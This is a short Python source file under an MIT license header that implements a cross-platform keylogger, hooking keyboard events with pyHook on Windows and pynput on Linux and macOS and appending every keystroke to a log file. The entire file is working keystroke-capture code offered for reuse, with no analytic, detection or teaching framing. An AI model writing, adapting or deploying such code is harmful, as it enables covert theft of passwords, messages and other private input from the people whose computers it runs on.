######################################################################################################################################################################################################################
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################


import os
import time

def start_keylogger(log_file_path):
    if os.name == 'nt':
        # Implement Windows keylogger logic
        import pyHook, pythoncom

        def OnKeyboardEvent(event):
            with open(log_file_path, 'a') as f:
                f.write(chr(event.Ascii))
            return True

        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()
    elif os.name == 'posix':
        # Implement Linux/MacOS keylogger logic
        # Example: Using  library
        from pynput import keyboard

        def on_press(key):
            with open(log_file_path, 'a') as f:
                f.write(str(key) + '\n')

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

if __name__ == "__main__":
    log_file_path = "/path/to/log_file"
    start_keylogger(log_file_path)
